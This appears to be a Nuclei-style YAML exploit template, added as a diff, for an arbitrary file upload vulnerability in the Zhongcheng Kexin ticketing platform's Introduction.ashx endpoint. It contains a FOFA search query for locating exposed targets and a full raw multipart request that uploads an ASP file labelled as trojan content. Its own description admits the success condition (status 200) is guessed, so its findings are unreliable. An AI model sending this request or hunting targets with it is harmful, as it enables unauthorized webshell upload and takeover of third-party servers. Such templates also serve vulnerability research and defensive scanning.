@@ -1,0 +1,61 @@
+id: poc-irwwpytx8k5f7dzi
+info:
+  name: 中城科信票务管理平台存在Introduction.ashx任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/irwwpytx8k5f7dzi
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: irwwpytx8k5f7dzi
+    fofa: FOFA：body="SystemManager/SoftwareLicense.htm"
+http:
+- raw:
+  - 'POST /SystemManager/Introduction.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 2215
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
+
+    Accept-Encoding: gzip
+
+
+    ----------------------------354575237365372692397370
+
+    Content-Disposition: form-data; name="file"; filename="1.txt"
+
+    Content-Type: image/jpeg
+
+
+    木马内容
+
+    ----------------------------354575237365372692397370
+
+    Content-Disposition: form-data; name="fileName"
+
+
+    1.asp
+
+    ----------------------------354575237365372692397370
+
+    Content-Disposition: form-data; name="Method"
+
+
+    UpdateUploadLinkPic
+
+    ----------------------------354575237365372692397370'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
